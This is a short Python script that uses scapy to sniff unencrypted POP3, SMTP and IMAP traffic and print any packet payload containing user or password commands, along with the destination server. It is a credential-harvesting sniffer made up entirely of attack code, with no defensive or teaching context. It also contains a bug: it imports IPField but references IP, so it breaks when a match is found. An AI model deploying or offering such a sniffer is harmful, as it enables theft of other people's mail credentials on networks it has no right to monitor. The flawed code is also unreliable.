from scapy.all import sniff, TCP, IPField


# Packet callback:
def packet_callback(packet):
    if packet[TCP].payload:  # Check packet for data payload
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():  # Check for 'USER' or 'PASS' mail command
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")  # Print data bytes and destination server


def main():
    # Fire up sniffer with BPF filter including only common mail port traffic (POP3 110, SMTP 25, IMAP 143)
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)


if __name__ == '__main__':
    main()
